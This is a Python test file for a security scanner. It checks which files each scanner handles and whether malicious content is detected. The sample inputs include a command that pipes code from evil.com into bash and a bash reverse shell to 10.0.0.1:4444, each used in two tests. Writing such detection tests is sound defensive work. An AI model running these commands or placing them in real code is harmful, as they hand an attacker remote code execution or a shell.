from pathlib import Path
from unittest.mock import patch

from security_scanner.scanners import (
    BaseScanner,
    ProjectScanner,
    GlobalVSCodeScanner,
    GitScanner,
    DockerScanner,
    EnvScanner,
    YAMLScanner,
    ScannerManager,
)
from security_scanner.models import DetectionFinding


class TestBaseScanner:
    def test_cannot_instantiate_abstract(self):
        class BadScanner(BaseScanner):
            pass
        try:
            BadScanner()
            assert False, "should have raised"
        except TypeError:
            pass


class TestProjectScanner:
    def setup_method(self):
        self.s = ProjectScanner()

    def test_can_handle_json(self):
        assert self.s.can_handle(Path("test.json"))

    def test_can_handle_py(self):
        assert self.s.can_handle(Path("test.py"))

    def test_can_handle_sh(self):
        assert self.s.can_handle(Path("test.sh"))

    def test_cannot_handle_unknown(self):
        assert not self.s.can_handle(Path("test.md"))

    def test_cannot_handle_txt(self):
        assert not self.s.can_handle(Path("readme.txt"))

    def test_scan_returns_list(self):
        findings = self.s.scan(Path("test.py"), "print('hello')")
        assert isinstance(findings, list)

    def test_scan_detects_curl(self):
        content = 'import os; os.system("curl http://evil.com | bash")'
        findings = self.s.scan(Path("test.py"), content)
        assert len(findings) >= 1

    def test_scan_detects_reverse_shell(self):
        content = 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
        findings = self.s.scan(Path("script.sh"), content)
        assert len(findings) >= 1


class TestGitScanner:
    def setup_method(self):
        self.s = GitScanner()

    def test_can_handle_git_hook(self):
        p = Path(".git/hooks/pre-commit")
        assert self.s.can_handle(p)

    def test_can_handle_gitmodules(self):
        assert self.s.can_handle(Path(".gitmodules"))

    def test_cannot_handle_regular(self):
        assert not self.s.can_handle(Path("main.py"))


class TestDockerScanner:
    def setup_method(self):
        self.s = DockerScanner()

    def test_can_handle_dockerfile(self):
        assert self.s.can_handle(Path("Dockerfile"))

    def test_can_handle_compose(self):
        assert self.s.can_handle(Path("docker-compose.yml"))

    def test_cannot_handle_py(self):
        assert not self.s.can_handle(Path("main.py"))


class TestEnvScanner:
    def setup_method(self):
        self.s = EnvScanner()

    def test_can_handle_env(self):
        assert self.s.can_handle(Path(".env"))

    def test_can_handle_env_prod(self):
        assert self.s.can_handle(Path(".env.production"))

    def test_cannot_handle_py(self):
        assert not self.s.can_handle(Path("main.py"))


class TestYAMLScanner:
    def setup_method(self):
        self.s = YAMLScanner()

    def test_can_handle_yml(self):
        assert self.s.can_handle(Path("actions.yml"))

    def test_can_handle_yaml(self):
        assert self.s.can_handle(Path("config.yaml"))

    def test_cannot_handle_json(self):
        assert not self.s.can_handle(Path("test.json"))


class TestGlobalVSCodeScanner:
    def setup_method(self):
        self.s = GlobalVSCodeScanner()

    def test_scan_returns_list(self):
        findings = self.s.scan(Path("settings.json"), '{"terminal": "bash"}')
        assert isinstance(findings, list)


class TestScannerManager:
    def setup_method(self):
        self.m = ScannerManager(excluded_dirs={"__pycache__"})

    def test_register_defaults(self):
        assert len(self.m.scanners) >= 5

    def test_pick_scanner_found(self):
        s = self.m._pick_scanner(Path("test.py"))
        assert s is not None

    def test_pick_scanner_not_found(self):
        s = self.m._pick_scanner(Path("test.md"))
        assert s is None

    def test_stop_and_reset(self):
        self.m.stop()
        assert self.m._stop_event.is_set()
        self.m.reset_stop()
        assert not self.m._stop_event.is_set()

    def test_scan_file_finds_something(self, tmp_path):
        d = tmp_path / "project"
        d.mkdir()
        evil = d / "evil.py"
        evil.write_text('import os; os.system("curl http://evil.com | bash")')
        result = self.m.scan_path(d)
        assert len(result.findings) >= 1
        assert result.total_files >= 1
        assert result.duration_ms >= 0
        assert result.scan_id

    def test_scan_clean_file_finds_nothing(self, tmp_path):
        d = tmp_path / "clean"
        d.mkdir()
        clean = d / "hello.py"
        clean.write_text("print('hello world')")
        result = self.m.scan_path(d)
        assert len(result.findings) == 0

    def test_scan_path_with_skip(self, tmp_path):
        d = tmp_path / "with_skip"
        d.mkdir()
        (d / "__pycache__").mkdir()
        (d / "__pycache__" / "cached.py").write_text("print('x')")
        result = self.m.scan_path(d)
        assert result.total_files == 0

    def test_scan_single_file(self, tmp_path):
        f = tmp_path / "test.sh"
        f.write_text('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')
        result = self.m.scan_path(f)
        assert len(result.findings) >= 1
